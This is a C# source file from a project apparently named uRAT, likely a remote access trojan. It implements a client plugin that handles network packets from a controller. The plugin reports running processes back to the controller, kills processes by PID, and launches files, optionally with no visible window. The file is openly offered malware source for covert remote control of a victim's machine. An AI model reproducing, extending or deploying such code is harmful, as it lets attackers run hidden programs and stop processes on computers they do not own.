using uNet2.Channel;
using uNet2.Packet;
using uNet2.SocketOperation;
using uRAT.ManagersClientPlugin.ProcessManager.Packets;
using uRAT.ManagersClientPlugin.ProcessManager.Tools;

namespace uRAT.ManagersClientPlugin.ProcessManager.Operations
{
    public class ProcessManagerOperation : SocketOperationBase
    {
        public override int OperationId
        {
            get { return 1; }
        }

        public override void PacketReceived(IDataPacket packet, IChannel sender)
        {
            if (packet is RefreshProcessesPacket)
            {
                foreach (var proc in ProcessHelper.GetRunningProcesses())
                {
                    SendPacket(new ProcessInformationPacket(proc.ProcessName, proc.Pid, proc.IsThis, proc.MemUsage));
                }
            } 
            else if (packet is KillProcessPacket)
            {
                ProcessHelper.KillProcessByPid((packet as KillProcessPacket).Pid);
            }
            else if (packet is StartProcessPacket)
            {
                var startProcPacket = packet as StartProcessPacket;
                ProcessHelper.StartProcess(new ProcessHelper.StartProcessOptions
                {
                    Filename = startProcPacket.Filename,
                    NoWindow = startProcPacket.NoWindow
                });
            }
            
        }

        public override void PacketSent(IDataPacket packet, IChannel targetChannel)
        {

        }

        public override void SequenceFragmentReceived(SequenceFragmentInfo fragmentInfo)
        {

        }

        public override void Disconnected()
        {
   
        }
    }
}
